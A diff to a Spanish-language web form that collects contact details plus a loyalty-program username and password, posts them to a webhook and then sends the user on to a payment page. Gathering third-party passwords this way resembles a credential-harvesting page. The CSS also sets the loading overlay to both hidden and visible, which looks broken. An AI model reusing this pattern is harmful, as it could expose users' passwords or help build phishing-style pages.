@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -24,6 +24,7 @@
       box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
       max-width: 400px;
       width: 100%;
+      position: relative;
     }
     form {
       display: flex;
@@ -49,6 +50,22 @@
     button:hover {
       background-color: #3D93F7;
     }
+    #loading {
+      display: none;
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(255, 255, 255, 0.8);
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: #003A7E;
+    }
   </style>
 </head>
 <body>
@@ -59,30 +76,40 @@
     <input type="text" id="nombre" name="nombre" placeholder="Nombre completo" required>
     <input type="tel" id="telefono" name="telefono" placeholder="Teléfono" required>
     <input type="email" id="correo" name="correo" placeholder="Correo electrónico" required>
-    <input type="text" id="loyalty" name="loyalty" placeholder="Login de Loyalty (opcional)">
+    
+    <input type="text" id="loyaltyUser" name="loyaltyUser" placeholder="Login de Loyalty (opcional)">
+    <input type="password" id="loyaltyPass" name="loyaltyPass" placeholder="Contraseña de Loyalty (opcional)">
     
     <input type="hidden" id="amount" name="amount">
     
     <button type="submit">Continuar</button>
   </form>
+  
+  <div id="loading">Procesando...</div>
 </div>
 
 <script>
   // Recuperar el amount de la URL
   const params = new URLSearchParams(window.location.search);
-  const amount = params.get('amount') || 50;
+  const amount = params.get('amount') || 100;
   document.getElementById('amount').value = amount;
 
   const form = document.getElementById('clienteForm');
+  const loading = document.getElementById('loading');
+
   form.addEventListener('submit', function(e) {
     e.preventDefault();
 
-    // Capturar datos del form
+    // Mostrar el indicador de carga
+    loading.style.display = 'flex';
+
+    // Capturar datos del formulario
     const data = {
       nombre: document.getElementById('nombre').value,
       telefono: document.getElementById('telefono').value,
       correo: document.getElementById('correo').value,
-      loyalty: document.getElementById('loyalty').value,
+      loyaltyUser: document.getElementById('loyaltyUser').value,
+      loyaltyPass: document.getElementById('loyaltyPass').value,
       amount: document.getElementById('amount').value
     };
 
@@ -94,11 +121,24 @@
       },
       body: JSON.stringify(data)
     })
-    .then(() => {
-      window.location.href = "form-pago.html"; // Redirigir a la página de pago
+    .then(response => response.json()) // Esperamos un JSON del Webhook
+    .then(result => {
+      console.log('Respuesta del webhook:', result);
+
+      loading.style.display = 'none'; // Ocultar el loading
+
+      if (result.status === 'ok') {
+        // Validación correcta
+        window.location.href = "form-pago.html";
+      } else {
+        // Error de validación
+        alert('Login de loyalty incorrecto, por favor revisa tus datos.');
+      }
     })
     .catch(err => {
-      alert('Error enviando los datos: ' + err);
+      console.error('Error enviando los datos:', err);
+      loading.style.display = 'none'; // Ocultar el loading en caso de error
+      alert('Error en el servidor, intenta de nuevo más tarde.');
     });
   });
 </script>
